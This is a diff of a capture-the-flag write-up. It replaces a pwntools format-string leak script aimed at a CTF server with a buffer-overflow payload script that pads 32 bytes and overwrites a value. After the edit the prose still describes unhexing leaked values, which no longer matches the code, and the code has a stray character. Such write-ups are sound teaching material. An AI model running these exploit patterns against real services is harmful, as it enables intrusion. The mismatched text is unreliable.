@@ -300,11 +300,17 @@ So I tried a buffer overflow, but it didn't work. Then I tried a format string v
 
 Hmm... doesn't it seem like hex values? Anyway, I wrote an exploit program using Python.
 
-python
+```
+from pwn import *
 
-CopyEdit
-
-`from pwn import * import re  p = remote("codefest-ctf.iitbhu.tech", 40796) p.recv() payload = b'%lx' * 15 p.sendline(payload) out = p.recv() print(out) print(unhex(out)) p.interactive() p.close()`
+context.binary = binary = "./chall"
+payload = b"a"*32 + p32(0x23456723)
+print(payload)
+p = remote("codefest-ctf.iitbhu.tech",59267)
+# p = process()
+p.sendline(payload)
+p.interactive()c
+```
 
 This will input the exploit payload and print the values unhexed. Running the program, I got:
 
